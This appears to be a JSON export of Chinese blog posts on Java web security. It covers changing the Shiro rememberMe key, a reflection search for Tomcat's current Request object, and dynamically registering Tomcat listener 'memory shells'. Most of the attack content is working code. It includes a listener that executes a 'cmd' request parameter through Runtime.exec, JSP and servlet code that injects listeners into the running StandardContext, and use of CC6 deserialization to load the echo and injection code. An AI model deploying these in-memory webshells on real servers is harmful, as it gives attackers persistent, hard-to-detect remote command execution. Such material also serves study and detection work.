之后我们在访问一下hello，在访问hello1。我们发现key已经被改了。 并且我们的登录认证也掉了。需要重新登陆。我在再重新登陆一下。我们可以发现重新登陆的key也是修改之后的。 只要不重启，key就是我们修改之后的。 因为我们的key是从线程里获取的Thread.currentThread()，所以我们反序列化的时候就可以进行key的修改。 还有另一种key的修改方式，是通过agent技术里面的Instrumentation，这里就不展开讲了。 加载器因为headers有长度限制，我们的payload如果复杂，可能过长，导致报错。这种情况，我们可以在rememberMe里面先传加载器。加载器先获取当前线程的request然后通过对body的操作进行复杂操作，这个加载器，我们后面文章在说。","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://f19t.github.io.git/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"},{"name":"shiro","slug":"shiro","permalink":"https://f19t.github.io.git/tags/shiro/"}]},{"title":"java内存马回显初探","slug":"java内存马回显初探","date":"2023-03-06T09:54:08.000Z","updated":"2023-03-06T10:41:15.554Z","comments":true,"path":"2023/03/06/java内存马回显初探/","link":"","permalink":"https://f19t.github.io.git/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/","excerpt":"java内存马回显初探在学习java内存马回显时，总是在复现别人的利用链，就想着我们自己该怎么去找构造链呢。在网上找资料的时候发现了https://github.com/c0ny1/java-object-searcher/,真的非常感谢大神们提供的寻找思路。为了检验之前学习的反射与算法基础，本篇文章详细讲解一下自己写搜索程序的过程。","text":"java内存马回显初探在学习java内存马回显时，总是在复现别人的利用链，就想着我们自己该怎么去找构造链呢。在网上找资料的时候发现了https://github.com/c0ny1/java-object-searcher/,真的非常感谢大神们提供的寻找思路。为了检验之前学习的反射与算法基础，本篇文章详细讲解一下自己写搜索程序的过程。 环境说明 Tomcat&#x2F;8.5.83 java version “1.8.0_152” idea 2023.3.2 前言我们再写内存马时，比如写linsener内存马时，需要先获取当前应用的StandardContext，回显的时候需要获取当前应用当前进程的response。又因为： Request对象可以获取到StandardContext，Request.getContext()。 Request对象也可以获得response，例如tomcat的Request具体实现类org.apache.catalina.connector.Request里面包含protected Response response; 所以我们如果能获取到当前访问的Request，我们就可以实现写内存马和进行回显。 准备知识存储Request的位置通常情况下，java-web作为多线程应用，Request对象通常存在在线程里面，我们可以通过Thread.currentThread() 来获取到当前的线程对象。例如我们写一个简单的jsp，println的位置下断点，我们通过idea自带的评估表达式（Evaluate），执行Thread.currentThread()看一下。 1234&lt;% String s = &quot;sss&quot;; System.out.println(s);%&gt; 我们发现获取到的确实是当前线程的对象，他的类型为org.apache.tomcat.util.threads.TaskThread。TaskThread继承了Thread。 反射获取TaskThread里面所有变量我们知道反射可以获取对象的字段、字段值、字段类型。反射学习详见：https://f19t.github.io/2023/02/19/Java%E5%8F%8D%E5%B0%84/ 所以这里我们可以写一个servlet程序获取到TaskThread的所有字段以及字段属性。 123456789101112131415161718192021222324252627282930313233343536import org.apache.tomcat.util.threads.TaskThread;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Modifier;/** * author: f19t * Date: 2023/3/2 14:52 */@WebServlet(&quot;/simple&quot;)public class simple extends HttpServlet &#123; @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; TaskThread t = (TaskThread) Thread.currentThread(); Field fields[] = TaskThread.class.getDeclaredFields(); for (int i = 0; i &lt; fields.length; i++) &#123; fields[i].setAccessible(true); try &#123; System.out.println(&quot;字段名=&quot;+fields[i].getName()); System.out.println(&quot;字段值=&quot;+fields[i].get(t));//get方法需要传入实例对象 System.out.println(&quot;字段类型=&quot;+fields[i].getType()); int mod = fields[i].getModifiers(); System.out.println(&quot;声明类型=&quot;+ Modifier.toString(mod)); System.out.println(&quot;----------------------------&quot;); &#125; catch (IllegalAccessException e) &#123; throw new RuntimeException(e); &#125; &#125; &#125;&#125; 12345678910输出：字段名=log字段值=org.apache.juli.logging.DirectJDKLog@397d3266字段类型=interface org.apache.juli.logging.Log声明类型=private static final----------------------------字段名=creationTime字段值=1677745450986字段类型=long声明类型=private final 为什么只输出了两个字段呢，那是因为TaskThread类里面确实只有这两个字段，但是我们调试的时候发现TaskThread里面有很多字段呀，这是因为TaskThread继承一些父类，我们要想获得TaskThread的所有字段，还得去遍历他们的父类,为了方便查看字段在哪个类里面，我们也打印一下类名。 1234567891011121314151617181920212223242526272829303132333435363738394041import org.apache.tomcat.util.threads.TaskThread;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Modifier;/** * author: f19t * Date: 2023/3/2 14:52 */@WebServlet(&quot;/simple&quot;)public class simple extends HttpServlet &#123; @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; TaskThread t = (TaskThread) Thread.currentThread(); try &#123; Class clazz = Class.forName(&quot;org.apache.tomcat.util.threads.TaskThread&quot;); for (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123; Field fields[] = clazz.getDeclaredFields(); for (int i = 0; i &lt; fields.length; i++) &#123; fields[i].setAccessible(true); System.out.println(&quot;类名=&quot; + clazz); System.out.println(&quot;字段名=&quot;+fields[i].getName()); System.out.println(&quot;字段类型=&quot;+fields[i].getType()); int mod = fields[i].getModifiers(); System.out.println(&quot;声明类型=&quot;+ Modifier.toString(mod)); System.out.println(&quot;字段值=&quot;+fields[i].get(t));//get方法需要传入实例对象 System.out.println(&quot;----------------------------&quot;); &#125; &#125; &#125; catch (ClassNotFoundException e) &#123; throw new RuntimeException(e); &#125; catch (IllegalAccessException e) &#123; throw new RuntimeException(e); &#125; &#125;&#125; 123456789101112131415161718192021222324252627结果：类名=class org.apache.tomcat.util.threads.TaskThread字段名=log字段类型=interface org.apache.juli.logging.Log声明类型=private static final字段值=org.apache.juli.logging.DirectJDKLog@21d6ac54----------------------------类名=class org.apache.tomcat.util.threads.TaskThread字段名=creationTime字段类型=long声明类型=private final字段值=1677750206025----------------------------类名=class java.lang.Thread字段名=name字段类型=class java.lang.String声明类型=private volatile字段值=http-nio-8080-exec-5----------------------------类名=class java.lang.Thread字段名=priority字段类型=int声明类型=private字段值=5----------------------------................后面字段省略 到这里我们获取了所有TaskThread的字段，字段的种类有很多我们需筛选，显然java提供的八种基础类型不是我们需要的。我们需要的类型是引用数据类型，也就是可能存在对象或者集合（集合里面可能存在其他类）。这里我们可以创建一个黑名单，在黑名单里面的我们不进行输出。到这里我们的Object的处理逻辑就清晰了，先判断是否是黑名单，如果是普通对象那么就进行取值，如果是集合类型或者是数组类型的我们将数组内的所有值都取出来。 123456789101112131415161718192021222324252627282930//黑名单public static boolean isblack(String s) &#123; Boolean aBoolean = false; List&lt;String&gt; black = new ArrayList&lt;String&gt;(Arrays.asList(&quot;java.lang.Byte&quot;, &quot;java.lang.Short&quot;, &quot;java.lang.Integer&quot;, &quot;java.lang.Long&quot;, &quot;java.lang.Float&quot;, &quot;java.lang.Boolean&quot;, &quot;java.lang.String&quot;, &quot;java.lang.Class&quot;, &quot;java.lang.Character&quot;, &quot;java.io.File&quot;, &quot;byte&quot;, &quot;short&quot;, &quot;int&quot;, &quot;long&quot;, &quot;double&quot;, &quot;float&quot;, &quot;boolean&quot; )); for (int i = 0; i &lt; black.size(); i++) &#123; if (s == black.get(i)) &#123; aBoolean = true; return aBoolean; &#125; &#125; return aBoolean; &#125; 123456789//判断listpublic static boolean is_list(String s) &#123; boolean b = false; if (&quot;List&quot;.equals(s) || &quot;ArrayList&quot;.equals(s))&#123; b = true; return b; &#125; return b; &#125; 123456789//判断mappublic static boolean is_map(String s) &#123; boolean b = false; if (&quot;Map&quot;.equals(s) || &quot;HashMap&quot;.equals(s))&#123; b = true; return b; &#125; return b; &#125; 这里我们使用广度优先搜索算法去遍历所有的变量。这里我们定义一个类似于c语言结构体的类，用来存储状态。 12345678910public class location &#123; public location(Object obj, String clazz, String path) &#123; this.obj = obj; this.path = path; this.clazz = clazz; &#125; public Object obj; public String path; public String clazz;&#125; 既然是广度优先搜索，我们还需要一个队列，表示有哪些需要进行搜索，还需要一个SET，set会记录哪些被搜索过了，防止被重复搜索。 12static Queue&lt;location&gt; queue = new LinkedList&lt;location&gt;();//队列保证广度优先搜索static Set&lt;Object&gt; set = new HashSet&lt;Object&gt;();//set记录哪些对象被搜索过 我们再创建一个白名单 12345678910//白名单public static boolean is_target(Field f,Object o) throws IllegalAccessException, ClassNotFoundException &#123; boolean b = false; if ( f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.connector.RequestFacade&quot;)) &amp;&amp; f.get(o).getClass().getName() !=&quot;java.lang.Object&quot; )&#123; return true; &#125; return b; &#125; 接下来我们设计广度优先搜索的入口： 12345678910public static void search() throws ClassNotFoundException &#123; location laco = new location(Thread.currentThread(), &quot;org.apache.tomcat.util.threads.TaskThread&quot;,&quot;TaskThread&quot;); queue.offer(laco); set.add(Thread.currentThread()); int i=0; while (queue.size()&gt;0) &#123; i++; basic_search.basic_search(queue.poll()); &#125; &#125; 这里看一下写的basic_search() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990 public static void basic_search(location lcat) throws ClassNotFoundException &#123; Object obj = lcat.obj; String path = lcat.path; Class clazz = Class.forName(lcat.clazz); try &#123;// Class clazz = Class.forName(&quot;org.apache.tomcat.util.threads.TaskThread&quot;); for (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123; Field fields[] = clazz.getDeclaredFields(); for (int i = 0; i &lt; fields.length; i++) &#123; fields[i].setAccessible(true); if (fields[i].get(obj) == null)&#123;continue;&#125; if (!Black.isblack(fields[i].getType().getName()) &amp;&amp; fields[i].get(obj) != null &amp;&amp; set.add(fields[i].get(obj))) &#123; if (judge_map.is_map(fields[i].getType().getSimpleName())) &#123; Map map = (Map) fields[i].get(obj); if (map.size() &gt; 0) &#123; for (int map_num = 0; map_num &lt; map.size(); map_num++) &#123; Object map_obj = map.get(map_num); if (map_obj != null &amp;&amp; set.add(map_obj) &amp;&amp; !Black.isblack(map_obj.getClass().getName())) &#123; location l = new location(map_obj, map_obj.getClass().getName(), path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + map_num + &quot;]&quot;+map_obj.getClass().getName());// System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + map_num + &quot;]&quot;); queue.offer(l); &#125; &#125; &#125; continue; &#125; else if (judge_list.is_list(fields[i].getType().getSimpleName())) &#123; List list = (List) fields[i].get(obj); if (list.size() &gt; 0) &#123; for (int list_num = 0; list_num &lt; list.size(); list_num++) &#123; Object list_obj = list.get(list_num); if (list_obj != null &amp;&amp; set.add(list_obj) &amp;&amp; !Black.isblack(list_obj.getClass().getName())) &#123; location l = new location(list_obj, list_obj.getClass().getName(), path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + list_num + &quot;]&quot;+list_obj.getClass().getName());// System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + list_obj.getClass().getName()+&quot;[&quot; + list_num + &quot;]&quot;); queue.offer(l); &#125; &#125; &#125; continue; &#125; else if (fields[i].getType().isArray()) &#123;// Object objarr1 = fields[i].get(obj); try &#123; Object[] arrobj = (Object[])fields[i].get(obj); if (arrobj.length &gt; 0) &#123; for (int obj_num = 0; obj_num &lt; arrobj.length; obj_num++) &#123; Object arr_obj = arrobj[obj_num]; if (arr_obj != null &amp;&amp; set.add(arr_obj) &amp;&amp; !Black.isblack(arr_obj.getClass().getName())) &#123; location l = new location(arr_obj, arr_obj.getClass().getName(), path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + obj_num + &quot;]&quot;+arr_obj.getClass().getName());// System.out.println(path + &quot;--&gt;&quot; + fields[i].getClass().getName() + &quot;[&quot; + obj_num + &quot;]&quot;); queue.offer(l); &#125; &#125; &#125; &#125;catch (Throwable e)&#123;// System.out.println(fields[i].get(obj)); &#125; continue; &#125; if (target.is_target(fields[i],obj)) &#123; System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;); &#125; location l = new location(fields[i].get(obj), fields[i].get(obj).getClass().getName(), path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;); search.queue.offer(l);// System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;); &#125; &#125; &#125; &#125; catch (IllegalAccessException ex) &#123; throw new RuntimeException(ex); &#125; &#125; 全部完整代码上传至https://github.com/f19t/java-Object-simple-search/ 因为我们为了让回显和写内存马更方便，我们这里只搜了RequestFacade，我们简单写一个simple去搜索一下。 1234567891011121314//simple@WebServlet(&quot;/simple&quot;)public class simple extends HttpServlet &#123; @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; try &#123; search.search(); &#125; catch (ClassNotFoundException e) &#123; throw new RuntimeException(e); &#125; &#125;&#125; 得到的输出是: 12345678TaskThread---&gt;group(java.lang.ThreadGroup)--&gt;threads[14]java.lang.Thread---&gt;target(org.apache.tomcat.util.net.NioEndpoint$Poller)---&gt;this$0(org.apache.tomcat.util.net.NioEndpoint)---&gt;handler(org.apache.coyote.AbstractProtocol$ConnectionHandler)---&gt;global(org.apache.coyote.RequestGroupInfo)--&gt;processors[0]org.apache.coyote.RequestInfo---&gt;req(org.apache.coyote.Request)--&gt;notes[1]org.apache.catalina.connector.Request---&gt;applicationRequest(org.apache.catalina.connector.RequestFacade) 这里就表明我们已经成功搜索并拿到了当前线程的RequestFacade。有了RequestFacade我们就可以拿到StandardContext,下面操作在 if (target.is_target(fields[i],obj)) {} 里面执行 1234567RequestFacade reqfd = (RequestFacade) fields[i].get(obj);Field f = reqfd.getClass().getDeclaredField(&quot;request&quot;);f.setAccessible(true);//因为是protectedRequest req = (Request) f.get(reqfd);//反射获取值StandardContext context = (StandardContext) req.getContext();ServletRequestListener listener = new ServletRequestListener() &#123;&#125;;context.addApplicationEventListener(listener); 也可以拿到当前线程的response 123456789RequestFacade reqfd = (RequestFacade) fields[i].get(obj);Field f = reqfd.getClass().getDeclaredField(&quot;request&quot;);f.setAccessible(true);//因为是protectedRequest req = (Request) f.get(reqfd);//反射获取值Field ff = req.getClass().getDeclaredField(&quot;response&quot;);ff.setAccessible(true);Response resp = (Response) ff.get(req);PrintWriter out = resp.getWriter();out.println(&quot;wwwwww&quot;); 我们可以很方便的把上面的代码组装成一个类，这样我们反序列化的时候可以使用加载字节码的方式执行我们的回显代码或者添加内存马。 完整代码 1https://github.com/f19t/java-Object-simple-search/blob/main/search-object/src/main/java/com/f19t/searchobject/searchobject/search_utill.java 反序列化简单利用我们把要执行的代码放到构建的AbstractTranslet类里面。 123Class f = Class.forName(&quot;org.hang.web_test.location&quot;);Method method = f.getMethod(&quot;search&quot;);method.invoke(null); 生成序列化数据，这里用的cc6反序列化执行代码。","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"tomcat动态注册内存马","slug":"tomcat动态注册内存马","date":"2023-03-06T09:53:43.000Z","updated":"2023-03-06T10:40:41.824Z","comments":true,"path":"2023/03/06/tomcat动态注册内存马/","link":"","permalink":"https://f19t.github.io.git/2023/03/06/tomcat%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%86%85%E5%AD%98%E9%A9%AC/","excerpt":"tomcat动态注册内存马去年10月学了一段时间内存马，并没有好好整理这段知识，今天重新梳理一下tomcat内存马的相关知识。","text":"tomcat动态注册内存马去年10月学了一段时间内存马，并没有好好整理这段知识，今天重新梳理一下tomcat内存马的相关知识。 javax.servlet.ServletContext首先为什么我们可以在容器中动态添加内存马，那是因为Servlet 3.0提供了动态注册这种机制，我们可以看到在javax.servlet.ServletContext接口中定义了如addServlet、addFilter、addListener这些接口。正因为有了这些接口，我们可以在具体的实现这些接口的类里面进行动态添加内存马。 123456789101112131415public interface ServletContext &#123; &lt;T extends Servlet&gt; T createServlet(Class&lt;T&gt; var1) throws ServletException; ServletRegistration.Dynamic addServlet(String var1, Class&lt;? extends Servlet&gt; var2); FilterRegistration.Dynamic addFilter(String var1, Class&lt;? extends Filter&gt; var2); &lt;T extends Filter&gt; T createFilter(Class&lt;T&gt; var1) throws ServletException; void addListener(Class&lt;? extends EventListener&gt; var1); &lt;T extends EventListener&gt; T createListener(Class&lt;T&gt; var1) throws ServletException; void addListener(Class&lt;? extends EventListener&gt; var1); &#125; 当我们使用的容器是tomcat时，我们使用idea查找所有实现ServletContext接口的类我们发现有五个。在不了解tomcat是如何添加addServlet、addFilter、addListener前提下我们也可以知道，动态添加内存马的关键在这五个类里面。 tomcat注册ListenerListener类都是实现了EventListener接口的类，所以实现类有很多，这里我们看一下实现了EventListener接口的ServletRequestListener接口。他有两个待实现函数，分别代表着request初始化时监听和request销毁时监听，非常适合做内存马。 123456789package javax.servlet;import java.util.EventListener;public interface ServletRequestListener extends EventListener &#123; void requestDestroyed(ServletRequestEvent var1); void requestInitialized(ServletRequestEvent var1);&#125; 我们实现一个简单的ServletRequestListener看一下linsener是如何被调用的。这里我们写的是requestDestroyed，因为每次请求结束request对象就会被销毁，所以可以调用到我们的监听。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import javax.servlet.*;import javax.servlet.annotation.WebListener;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;@WebListener(&quot;/TestListener&quot;)public class shell_linsener implements ServletRequestListener &#123; @Override public void requestDestroyed(ServletRequestEvent s) &#123; HttpServletRequest req = (HttpServletRequest) s.getServletRequest();//下断点 String cmd = req.getParameter(&quot;cmd&quot;); try&#123; Field reqField = req.getClass().getDeclaredField(&quot;request&quot;); reqField.setAccessible(true); // org.apache.catalina.connector.Request Object reqObj = reqField.get(req); // org.apache.catalina.connector.Response HttpServletResponse rep = (HttpServletResponse) reqObj.getClass().getDeclaredMethod(&quot;getResponse&quot;).invoke(reqObj); PrintWriter out = rep.getWriter();// rep.sendError(404); out.println(&quot;linsener_resp_test&quot;); &#125;catch(NoSuchFieldException | IllegalAccessException | NoSuchMethodException | InvocationTargetException e)&#123; e.printStackTrace(); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; if (cmd != null)&#123; try &#123; Runtime.getRuntime().exec(cmd); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (NullPointerException n) &#123; n.printStackTrace(); &#125; &#125; &#125; @Override public void requestInitialized(ServletRequestEvent s) &#123; &#125;&#125; 我们在HttpServletRequest req &#x3D; (HttpServletRequest) s.getServletRequest();这一行下断点。会发现调用链。 12345678910111213141516requestDestroyed:22, shell_linsener (org.hang.web_test)fireRequestDestroyEvent:6019, StandardContext (org.apache.catalina.core)invoke:177, StandardHostValve (org.apache.catalina.core)invoke:92, ErrorReportValve (org.apache.catalina.valves)invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)invoke:78, StandardEngineValve (org.apache.catalina.core)service:367, CoyoteAdapter (org.apache.catalina.connector)service:639, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:885, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1693, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang) fireRequestDestroyEvent调用了我们写的linsener，我们跟进fireRequestDestroyEvent看一下他是逻辑是怎么样的。 123456789101112131415161718192021222324public boolean fireRequestDestroyEvent(ServletRequest request) &#123; Object[] instances = this.getApplicationEventListeners();//获取所有的listener if (instances != null &amp;&amp; instances.length &gt; 0) &#123; ServletRequestEvent event = new ServletRequestEvent(this.getServletContext(), request); for(int i = 0; i &lt; instances.length; ++i) &#123; int j = instances.length - 1 - i; if (instances[j] != null &amp;&amp; instances[j] instanceof ServletRequestListener) &#123; ServletRequestListener listener = (ServletRequestListener)instances[j]; try &#123; listener.requestDestroyed(event); &#125; catch (Throwable var8) &#123; ExceptionUtils.handleThrowable(var8); this.getLogger().error(sm.getString(&quot;standardContext.requestListener.requestInit&quot;, new Object[]&#123;instances[j].getClass().getName()&#125;), var8); request.setAttribute(&quot;javax.servlet.error.exception&quot;, var8); return false; &#125; &#125; &#125; &#125; return true;&#125; 关键代码Object[] instances &#x3D; this.getApplicationEventListeners();意思是获取所有的linsener并形成数组，如果数组不为空，则执行每个数组的listener.requestDestroyed(event); 这里我们再继续看一下getApplicationEventListeners()这个方法。位于org.apache.catalina.core.StandardContext，可以看到返回的是applicationEventListenersList这个数组。 123public Object[] getApplicationEventListeners() &#123; return this.applicationEventListenersList.toArray(); &#125; 我们再看一下applicationEventListenersList这个列表是哪里来的。可以看到他是一个CopyOnWriteArrayList数组，既然是数组我们就可以使用add方法进行添加。 1private List&lt;Object&gt; applicationEventListenersList = new CopyOnWriteArrayList(); 所以我们在org.apache.catalina.core.StandardContext找一下哪里调用了applicationEventListenersList。add方法。 我们找到了两个地方可以调用add。 1234567891011public void setApplicationEventListeners(Object[] listeners) &#123; this.applicationEventListenersList.clear(); if (listeners != null &amp;&amp; listeners.length &gt; 0) &#123; this.applicationEventListenersList.addAll(Arrays.asList(listeners)); &#125; &#125; public void addApplicationEventListener(Object listener) &#123; this.applicationEventListenersList.add(listener); &#125; 学了反射我们有很多种方式可以在我们自己创建的StandardContext中添加我们的listeners（在我们的环境中）。下放列举一种例如： 12345Class c = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;);Constructor ct1 = c.getConstructor();//不会初始化，无参构造StandardContext obj = (StandardContext)ct1.newInstance();ServletRequestListener listener = new ServletRequestListener() &#123;&#125;obj.addApplicationEventListener(listener); 但是由于tomcat架构的原因，我们不能这样操作，我们得添加到对方的StandardContext里面去。 那么如何才能获取到当前应用的StandardContext呢，也就是当前运行中tomcat的StandardContext呢。还是看我们的调用链，我们在invoke:177, StandardHostValve (org.apache.catalina.core)&#x2F;&#x2F;看这一行，跟进去一下。 12345678910111213141516requestDestroyed:22, shell_linsener (org.hang.web_test)fireRequestDestroyEvent:6019, StandardContext (org.apache.catalina.core)invoke:177, StandardHostValve (org.apache.catalina.core)//看这一行invoke:92, ErrorReportValve (org.apache.catalina.valves)invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)invoke:78, StandardEngineValve (org.apache.catalina.core)service:367, CoyoteAdapter (org.apache.catalina.connector)service:639, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:885, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1693, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang) 发现他调用了context.fireRequestDestroyEvent 123if (!request.isAsync() &amp;&amp; !asyncAtStart) &#123; context.fireRequestDestroyEvent(request.getRequest()); &#125; 然后我们再找一下context.fireRequestDestroyEvent的context是哪里来的，发现 Context context &#x3D; request.getContext(); 也就是说可以通过当前应用的request来获取当前应用的context。 123456public final void invoke(Request request, Response response) throws IOException, ServletException &#123; Context context = request.getContext(); if (context == null) &#123; if (!response.isError()) &#123; response.sendError(404); &#125; 我们去org.apache.catalina.connector.Request包里，也是可以发现存在getContext方法。 123public Context getContext() &#123; return this.mappingData.context; &#125; 也就是说我们可以通过Request来获取Context，那我们如何获取当前应用的Request呢。 JSP写Listener首先我们先看jsp如何写Listener。因为jsp内置了Request，我们写个简单的程序下断点跟进一下。 123&lt;% HttpSession s = request.getSession();//下断点%&gt; 我们可以看到请求的过程中存在request和response，他们的对象为RequestFacade 1234567891011121314151617181920212223242526272829_jspService:16, test_jsp (org.apache.jsp)service:70, HttpJspBase (org.apache.jasper.runtime)service:765, HttpServlet (javax.servlet.http)service:465, JspServletWrapper (org.apache.jasper.servlet)serviceJspFile:383, JspServlet (org.apache.jasper.servlet)service:331, JspServlet (org.apache.jasper.servlet)service:765, HttpServlet (javax.servlet.http)internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)doFilter:166, ApplicationFilterChain (org.apache.catalina.core)doFilter:52, WsFilter (org.apache.tomcat.websocket.server)internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)doFilter:166, ApplicationFilterChain (org.apache.catalina.core)invoke:197, StandardWrapperValve (org.apache.catalina.core)invoke:97, StandardContextValve (org.apache.catalina.core)invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)invoke:135, StandardHostValve (org.apache.catalina.core)invoke:92, ErrorReportValve (org.apache.catalina.valves)invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)invoke:78, StandardEngineValve (org.apache.catalina.core)service:367, CoyoteAdapter (org.apache.catalina.connector)service:639, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:885, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1693, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang) 我们查看一下RequestFacade，发现其存在Request变量。 12public class RequestFacade implements HttpServletRequest &#123; protected Request request = null;&#125; 所以这里我们可以通过反射RequestFacade获取Request。 1234Field f = request.getClass().getDeclaredField(&quot;request&quot;);f.setAccessible(true);//因为是protectedRequest req = (Request) f.get(request);//反射获取值StandardContext context = (StandardContext) req.getContext(); //直接通过request获取StandardContext 完整jsp代码如下： 1234567891011121314151617181920212223242526272829303132&lt;% Field f = request.getClass().getDeclaredField(&quot;request&quot;); f.setAccessible(true);//因为是protected Request req = (Request) f.get(request);//反射获取值 StandardContext context = (StandardContext) req.getContext(); //直接通过request获取StandardContext ServletRequestListener listener = new ServletRequestListener() &#123; @Override public void requestDestroyed(ServletRequestEvent sre) &#123; &#125; @Override public void requestInitialized(ServletRequestEvent sre) &#123; HttpServletRequest req = (HttpServletRequest) sre.getServletRequest(); try &#123; Field reqField = req.getClass().getDeclaredField(&quot;request&quot;); reqField.setAccessible(true); // org.apache.catalina.connector.Request Object reqObj = reqField.get(req); // org.apache.catalina.connector.Response HttpServletResponse rep = (HttpServletResponse) reqObj.getClass().getDeclaredMethod(&quot;getResponse&quot;).invoke(reqObj); PrintWriter out = rep.getWriter(); out.println(&quot;d_add_hack&quot;); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125;; context.addApplicationEventListener(listener);%&gt; 访问jsp文件发现linsener成功添加。 Servlet写Listener因为普通的Servlet继承了HttpServlet，里面包含HttpServletRequest和HttpServletResponse，我们发现具体实现类还是RequestFacade，那么我们可以和jsp一样的构造。访问即可成功添加Listener 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import org.apache.catalina.connector.Request;import org.apache.catalina.core.StandardContext;import javax.servlet.ServletException;import javax.servlet.ServletRequestEvent;import javax.servlet.ServletRequestListener;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;/** * author: f19t * Date: 2023/2/28 16:45 */@WebServlet(value = &quot;/test_StandardContext&quot;)public class Test_StandardContext extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; Request req1 = null; try &#123; Field f = req.getClass().getDeclaredField(&quot;request&quot;); f.setAccessible(true); req1 = (Request) f.get(req); StandardContext obj = (StandardContext) req1.getContext(); ServletRequestListener listener = new ServletRequestListener() &#123; @Override public void requestDestroyed(ServletRequestEvent sre) &#123; &#125; @Override public void requestInitialized(ServletRequestEvent sre) &#123; HttpServletRequest req = (HttpServletRequest) sre.getServletRequest(); try &#123; Field reqField = req.getClass().getDeclaredField(&quot;request&quot;); reqField.setAccessible(true); // org.apache.catalina.connector.Request Object reqObj = reqField.get(req); // org.apache.catalina.connector.Response HttpServletResponse rep = (HttpServletResponse) reqObj.getClass().getDeclaredMethod(&quot;getResponse&quot;).invoke(reqObj); PrintWriter out = rep.getWriter(); out.println(&quot;d_add_hack&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125;; obj.addApplicationEventListener(listener); &#125; catch (IllegalAccessException e) &#123; throw new RuntimeException(e); &#125; catch (NoSuchFieldException e) &#123; throw new RuntimeException(e); &#125; &#125; 